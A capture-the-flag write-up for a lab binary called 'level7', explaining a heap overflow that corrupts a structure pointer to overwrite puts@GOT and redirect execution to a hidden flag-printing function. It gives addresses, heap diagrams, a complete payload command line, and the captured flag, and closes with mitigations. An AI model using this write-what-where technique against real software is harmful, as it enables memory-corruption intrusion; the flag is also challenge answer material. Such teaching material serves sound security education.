# 🎯 Level7 - Heap Structure Corruption with GOT Overwrite

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Advanced heap exploitation - structure pointer corruption for arbitrary writes! 🔥

## 📋 Binary Analysis

### 🎯 Key Functions (Decompiled)

```c
char c[80];  // Global buffer for the flag

struct data_struct {
    int id;        // 4 bytes
    char *data;    // 4 bytes pointer
};

void m(void)
{
    time_t current_time;
    
    current_time = time(NULL);
    printf("%s - %d\n", c, current_time);  // 🎯 Prints the flag!
}

int main(int argc, char **argv)
{
    struct data_struct *ptr1;
    struct data_struct *ptr2;
    FILE *file;
    
    // Allocate two structures and their data buffers
    ptr1 = malloc(sizeof(struct data_struct));
    ptr1->id = 1;
    ptr1->data = malloc(8);                     // 8-byte buffer
    
    ptr2 = malloc(sizeof(struct data_struct));
    ptr2->id = 2;
    ptr2->data = malloc(8);                     // 8-byte buffer
    
    // Vulnerable strcpy calls
    strcpy(ptr1->data, argv[1]);                // ⚠️ No bounds check!
    strcpy(ptr2->data, argv[2]);                // ⚠️ Writes to controlled pointer!
    
    // Read flag into global 'c'
    file = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, file);
    
    puts("~~");                                 // Just prints "~~"
    return 0;
}
```

### 🔑 Key Addresses

| Element | Address | Notes |
|---------|---------|-------|
| **Function `m()`** | `0x080484f4` | Target - prints flag |
| **Global `c`** | `0x08049960` | 80-byte buffer for flag |
| **GOT `puts@GOT`** | `0x08049928` | We'll overwrite this |
| **ptr1 struct** | `0x0804a008` | First heap structure |
| **ptr1->data** | `0x0804a018` | 8-byte buffer (vulnerable) |
| **ptr2 struct** | `0x0804a028` | Second heap structure |
| **ptr2->data** | `0x0804a038` | 8-byte buffer |

**Key Observations:**
- Two heap structures with embedded pointers
- strcpy with no bounds checking on both buffers
- Hidden function `m()` that prints global `c`
- Program reads flag but only prints "~~"
- We need to redirect `puts()` to call `m()`

## 🚨 The Challenge

This level introduces **heap structure corruption** - not just overflowing a buffer, but corrupting the structure's pointer to gain arbitrary write capability.

**The Setup:**
```c
ptr1 = {id: 1, data: 0x0804a018}  // Structure with pointer
ptr2 = {id: 2, data: 0x0804a038}  // Structure with pointer

strcpy(ptr1->data, argv[1]);      // Overflow! Can reach ptr2 structure
strcpy(ptr2->data, argv[2]);      // Writes to wherever ptr2->data points!
```

**The Problem:**
- Program reads the flag into global `c` but never prints it
- Only prints "~~" via `puts()`
- We need to make the program execute `m()` which prints `c`

**The Solution:**
1. Overflow `ptr1->data` to corrupt `ptr2->data` pointer
2. Make `ptr2->data` point to `puts@GOT`
3. Use `argv[2]` to overwrite `puts@GOT` with address of `m()`
4. When `puts("~~")` is called → executes `m()` → prints flag!

## 🎯 How the Exploit Works

### Understanding Heap Structures

**What are Heap Structures?**

In this program, each "structure" is an 8-byte allocation containing:
```c
struct data_struct {
    int id;        // 4 bytes - identifier
    char *data;    // 4 bytes - pointer to another heap buffer
};
```

These structures create **pointer relationships** on the heap:
```
ptr1 ──┐
       ├──> [id: 1][data ptr] ──> [8-byte buffer for string]
       
ptr2 ──┐
       ├──> [id: 2][data ptr] ──> [8-byte buffer for string]
```

### Heap Layout Discovery

Using `ltrace` to see the allocations:

```bash
$ ltrace ./level7 AAA BBB

malloc(8)  = 0x0804a008  ← ptr1 structure
malloc(8)  = 0x0804a018  ← ptr1->data buffer
malloc(8)  = 0x0804a028  ← ptr2 structure
malloc(8)  = 0x0804a038  ← ptr2->data buffer
```

**Distance calculations:**
- From `ptr1->data` (0x0804a018) to `ptr2 structure` (0x0804a028): **16 bytes**
- From `ptr1->data` (0x0804a018) to `ptr2->data field` (0x0804a02c): **20 bytes**

### Visual: Heap Structure Layout

```
INITIAL STATE:
════════════════════════════════════════════════════════════════
0x0804a008: ┌──────────────────────────────────────────────┐
            │ ptr1 structure (8 bytes)                     │
            │ [id = 1 (4 bytes)][data = 0x0804a018 (4B)]  │
            │                            │                 │
            │                            ↓                 │
0x0804a018: ├──────────────────────────────────────────────┤
            │ ptr1->data buffer (8 bytes)                  │
            │ [empty - will hold argv[1]]                  │
            │                                              │
0x0804a028: ├──────────────────────────────────────────────┤
            │ ptr2 structure (8 bytes)         ← TARGET!   │
            │ [id = 2 (4 bytes)][data = 0x0804a038 (4B)]  │
            │                            │                 │
            │                            ↓                 │
0x0804a038: ├──────────────────────────────────────────────┤
            │ ptr2->data buffer (8 bytes)                  │
            │ [empty - will hold argv[2]]                  │
            └──────────────────────────────────────────────┘


AFTER OVERFLOW (argv[1] = "A"*20 + "\x28\x99\x04\x08"):
════════════════════════════════════════════════════════════════
0x0804a008: ┌──────────────────────────────────────────────┐
            │ ptr1 structure                               │
            │ [id = 1][data = 0x0804a018]                  │
            │                  │                           │
            │                  ↓                           │
0x0804a018: ├──────────────────────────────────────────────┤
            │ AAAAAAAA (8 bytes)                           │
            │ AAAAAAAA (8 bytes)                           │ ← 16 bytes overflow
            │ AAAA     (4 bytes)                           │ ← +4 bytes overflow
0x0804a028: ├──────────────────────────────────────────────┤
            │ ptr2 structure (CORRUPTED!)                  │
            │ [id = 0x41414141 (overwritten)]             │
0x0804a02c: │ [data = 0x08049928] ← puts@GOT! ✅          │
            │          │                                   │
            │          └─────────────────┐                │
0x0804a038: ├──────────────────────────────────────────────┤
            │                            ↓                 │
            └──────────────────────────────────────────────┘
            
Now ptr2->data points to puts@GOT instead of 0x0804a038!


AFTER SECOND strcpy (argv[2] = "\xf4\x84\x04\x08"):
════════════════════════════════════════════════════════════════
strcpy(ptr2->data, argv[2]) becomes:
strcpy(0x08049928, "\xf4\x84\x04\x08")
       └─ puts@GOT   └─ address of m()

GOT Table:
  puts@GOT (0x08049928) = 0x080484f4 (m function) ✅
```

### The Attack Strategy

**Stage 1: Corrupt Pointer (argv[1])**

Overflow `ptr1->data` to overwrite `ptr2->data` field:
```python
argv[1] = "A" * 20 + "\x28\x99\x04\x08"
           └─padding┘  └─ puts@GOT ─┘
```

**Breakdown:**
- Bytes 0-7: Fill `ptr1->data` buffer
- Bytes 8-15: Overflow into heap metadata
- Bytes 16-19: Overflow into `ptr2->id` field (doesn't matter)
- **Bytes 20-23: Overwrite `ptr2->data` field with `0x08049928`** (puts@GOT)

**Stage 2: Exploit Corrupted Pointer (argv[2])**

Write to the corrupted pointer:
```python
argv[2] = "\xf4\x84\x04\x08"
          └─ address of m() ─┘
```

When `strcpy(ptr2->data, argv[2])` executes:
- `ptr2->data` = `0x08049928` (puts@GOT)
- Copies `"\xf4\x84\x04\x08"` to address `0x08049928`
- **Result: `puts@GOT` now points to `m()`!**

**Stage 3: Trigger Exploit**

Program calls `puts("~~")`:
- PLT looks up `puts@GOT`
- Gets `0x080484f4` (address of `m()` instead of libc `puts`)
- Jumps to `m()`
- `m()` executes: `printf("%s - %d\n", c, time(NULL))`
- **Flag printed!** 🎉

### The Write-What-Where Primitive

This exploit demonstrates a powerful technique: **write-what-where**

By corrupting a structure's pointer:
- **WHERE**: We control the destination (`ptr2->data` = `puts@GOT`)
- **WHAT**: We control the value (`argv[2]` = address of `m()`)

This is more powerful than simple overflows - we can write arbitrary values to arbitrary memory locations!

### Complete Execution Flow

```
Step 1: Program Start
─────────────────────
Command: ./level7 "AAA...AAA\x28\x99\x04\x08" "\xf4\x84\x04\x08"
         argv[1] = 24 bytes (overflow)
         argv[2] = 4 bytes (m's address)


Step 2: Heap Allocations
─────────────────────────
malloc(8): ptr1       = 0x0804a008
malloc(8): ptr1->data = 0x0804a018
malloc(8): ptr2       = 0x0804a028
malloc(8): ptr2->data = 0x0804a038

Initial state:
  ptr1->id = 1
  ptr1->data = 0x0804a018
  ptr2->id = 2
  ptr2->data = 0x0804a038


Step 3: First strcpy (argv[1] - Structure Corruption)
──────────────────────────────────────────────────────
strcpy(ptr1->data, argv[1]):
  Copies 24 bytes: "AAA...AAA\x28\x99\x04\x08"
  
  Overwrites:
    - ptr1->data buffer (8 bytes)
    - Heap metadata (8 bytes)
    - ptr2->id (4 bytes) → becomes 0x41414141
    - ptr2->data (4 bytes) → becomes 0x08049928 ✅

Result:
  ptr2->data = 0x08049928 (puts@GOT)


Step 4: Second strcpy (argv[2] - GOT Overwrite)
────────────────────────────────────────────────
strcpy(ptr2->data, argv[2]) becomes:
strcpy(0x08049928, "\xf4\x84\x04\x08")

Writes to GOT:
  puts@GOT (0x08049928) = 0x080484f4 ✅

GOT table updated:
  puts now points to m() instead of libc puts!


Step 5: fopen/fgets (Flag Read)
────────────────────────────────
file = fopen("/home/user/level8/.pass", "r");
fgets(c, 68, file);

Global variable c now contains the flag.


Step 6: puts("~~") Call - Hijacked!
────────────────────────────────────
Program: puts("~~")
    ↓
PLT: Reads puts@GOT (0x08049928)
    ↓
Gets: 0x080484f4 (address of m, not libc puts!)
    ↓
Jumps to: m() function
    ↓
m() executes:
  current_time = time(NULL);
  printf("%s - %d\n", c, current_time);
    ↓
Output: <FLAG> - <timestamp>


Step 7: Flag Retrieved! 🎉
───────────────────────────
Flag printed to stdout with timestamp.
```

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Heap overflow** | ✅ | strcpy() has no bounds checking on ptr1->data |
| **Structure corruption** | ✅ | Overflow reaches ptr2 structure (20 bytes away) |
| **Pointer control** | ✅ | We can overwrite ptr2->data field |
| **Write primitive** | ✅ | strcpy(ptr2->data, argv[2]) writes to controlled address |
| **Known addresses** | ✅ | m() at 0x080484f4, puts@GOT at 0x08049928 |
| **Writable GOT** | ✅ | No RELRO protection |
| **Target function** | ✅ | m() prints global c |
| **No ASLR** | ✅ | Heap and GOT addresses are predictable |

### Key Insight

**Exploit Evolution:**
- **Level5**: Format string → direct GOT overwrite
- **Level6**: Heap overflow → function pointer overwrite
- **Level7**: **Heap structure corruption → indirect GOT overwrite** ⭐ NEW!

This combines multiple techniques:
1. **Heap overflow** (like level6)
2. **Structure pointer corruption** (new concept!)
3. **Write-what-where primitive** (control both target AND value)
4. **GOT overwrite** (like level5, but via corrupted heap pointer)

**Why this is powerful:**
- Can write arbitrary values to arbitrary addresses
- Bypasses many protections that focus on direct overwrites
- Common in real-world exploits (UAF, heap corruption)
- Demonstrates advanced heap manipulation

## 💣 Execute the Exploit

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

**Expected output:**
```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1770288544
```

The flag is printed along with the current timestamp!

---

> 💡 **Pro Tip**: Structure pointer corruption is a fundamental technique in modern heap exploitation. Understanding how to corrupt pointers to gain write-what-where primitives is essential for advanced exploitation!

> ⚠️ **Security Note**: Modern protections against this attack:
> - **RELRO (Full)** - Makes GOT read-only after program load
> - **Heap Canaries** - Detects heap metadata corruption
> - **ASLR** - Randomizes heap and library addresses
> - **Structure Validation** - Check pointer sanity before use
> 
> **Safe coding practices:**
> - Use `strncpy()` or `strlcpy()` instead of `strcpy()`
> - Validate structure integrity before dereferencing pointers
> - Use safe string handling libraries
> - Enable all modern protections (RELRO, ASLR, etc.)

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
